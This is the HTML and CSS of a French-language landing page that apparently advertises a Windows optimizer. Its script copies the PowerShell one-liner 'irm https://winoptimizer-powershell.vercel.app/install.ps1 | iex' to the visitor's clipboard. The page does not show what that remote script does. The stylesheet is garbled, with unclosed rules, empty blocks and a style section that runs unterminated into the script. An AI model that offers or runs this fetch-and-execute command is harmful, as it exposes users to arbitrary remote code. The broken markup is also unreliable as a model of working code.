<style>
* {
    margin: 0;

    box-sizing: border-box;

body {
    font-family: "Inter", sans-serif;

body::before {

    width: 600px;

    gap: 8px;
    justify-content: center;
    margin-bottom: 40px;
}

.logo div {
    width: 26px;
    height: 26px;
    background: linear-gradient(145deg, #3aa0ff, #0066ff);
    box-shadow: 0 0 15px rgba(0,120,255,0.6);
}

/* TITRE */
h1 {
    font-size: 64px;
    font-weight: 600;
    line-height: 1.1;
    letter-spacing: -1px;
    margin-bottom: 24px;
}

.highlight {
    color: #3aa0ff;
}

/* TEXTE */
p {
    font-size: 20px;
    color: #9aa4b2;
    line-height: 1.6;
    margin-bottom: 60px;
}

/* TERMINAL */
.terminal {
    width: 760px;
    margin: auto;
    background: rgba(5,10,20,0.85);
    border: 1px solid rgba(100,140,255,0.2);
    border-radius: 14px;
    padding: 20px 24px 26px;
    box-shadow: 
        0 0 40px rgba(0,120,255,0.15),
        inset 0 0 20px rgba(0,120,255,0.05);
}

/* HEADER TERMINAL */
.terminal-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 18px;
}

/* DOTS */
.dots {

<script>
function copyCommand(btn) {
    const text = "irm https://winoptimizer-powershell.vercel.app/install.ps1 | iex";

    navigator.clipboard.writeText(text);

    btn.textContent = "Copié !";
    btn.classList.add("copied");

    setTimeout(() => {
        btn.textContent = "Copier";
        btn.classList.remove("copied");
    }, 2000);
}
</script>
